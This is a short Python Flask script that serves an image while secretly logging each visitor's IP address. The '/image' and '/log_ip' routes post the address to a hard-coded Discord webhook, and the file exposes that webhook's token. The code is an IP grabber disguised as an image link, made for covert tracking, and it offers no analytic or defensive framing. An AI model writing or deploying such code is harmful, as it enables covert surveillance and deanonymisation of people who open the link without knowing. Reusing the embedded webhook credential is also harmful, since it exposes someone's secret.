import requests
from flask import Flask, request, redirect, send_file
from io import BytesIO
import base64

app = Flask(__name__)

# Replace with your Discord webhook URL
WEBHOOK_URL = 'https://discord.com/api/webhooks/1432288829955637248/8VWpklQXtH0E4xo8cj7lyqkEGcj0pXlQLXEHhf2PYUwHCiosIRS2aJSH5jDclFVcMziq'

@app.route('/')
def index():
    # Replace with the URL of the image you want to display
    image_url = 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS8nfcTGO9-6QtPWezQiHoq8xTyyejE8Fs_rw&s'
    return f'<img src="{image_url}" alt="Logged Image">'

@app.route('/log_ip', methods=['POST'])
def log_ip():
    user_ip = request.remote_addr
    data = {
        "content": f"IP Address logged: {user_ip}"
    }
    requests.post(WEBHOOK_URL, json=data)
    return '', 204

@app.route('/image', methods=['GET'])
def serve_image():
    # Replace with the URL of the image you want to display
    image_url = 'YOUR_IMAGE_URL'
    response = requests.get(image_url)
    img_data = response.content

    # Log the IP address
    user_ip = request.remote_addr
    data = {
        "content": f"IP Address logged: {user_ip}"
    }
    requests.post(WEBHOOK_URL, json=data)

    return send_file(BytesIO(img_data), mimetype='image/jpeg')

if __name__ == '__main__':
    app.run(port=5000)
